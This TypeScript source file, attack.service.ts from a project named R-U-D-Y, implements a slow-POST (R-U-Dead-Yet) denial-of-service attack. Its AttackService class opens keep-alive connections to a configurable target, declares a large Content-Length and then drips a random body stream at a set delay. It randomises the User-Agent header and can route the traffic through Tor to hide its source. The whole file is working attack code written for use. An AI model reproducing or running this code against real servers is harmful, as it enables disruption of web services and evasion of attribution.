//
//  attack.service.ts
//  R-U-D-Y
//
//  Created by Sahil Chaddha on 09/05/2018.
//  Copyright © 2018 R-U-D-Y. All rights reserved.
//
/* tslint:disable object-literal-sort-keys object-literal-key-quotes no-this-assignment */
import IService from "./service"
import logger from "../utils/logger"
import NetworkService, { HTTPMethod, IResponsePayload } from "./network.service"
import StreamService from "./stream.service"
import { Headers } from "request"
const userAgent = require("random-useragent")

export interface IAttackServiceResponsePayload {
    status: number
    message: string
    data?: object
}

export interface IAttackServiceConfig {
    attackId: number
    target: string
    method: HTTPMethod
    packet_len: number
    delay: number
    shouldUseTor: boolean
}

class AttackService implements IService {
    public serviceName: string = "Attack_Service"
    private config: IAttackServiceConfig
    private streamService: StreamService
    constructor(config: IAttackServiceConfig) {
        this.config = config
        this.streamService = new StreamService({delay: this.config.delay})
    }
    public attack() {
        const self = this

        NetworkService.request({url: this.config.target, method: this.config.method, headers: this.getHeaders(),
                                data: this.streamService.getRandomReadStream(), shouldUseTor: this.config.shouldUseTor})
        .then((resPayload: IResponsePayload) => {
            logger.info({message: "Request Succeeded. RUDY attack failed attackId : " + self.config.attackId,
                         category: this.serviceName, data: resPayload})
            self.streamService.endStream()
        })
        .catch((err) => {
            logger.error({message: err.code + " :: Error Occured attackId : " + self.config.attackId,
                          category: self.serviceName, data: err})
            self.streamService.endStream()
        })
    }

    private getHeaders(): Headers {
        const headers: Headers = {
            "Connection": "keep-alive",
            "Content-Length": this.config.packet_len.toString(),
            "User-Agent": userAgent.getRandom(),
        }

        return headers
    }
}

export default AttackService
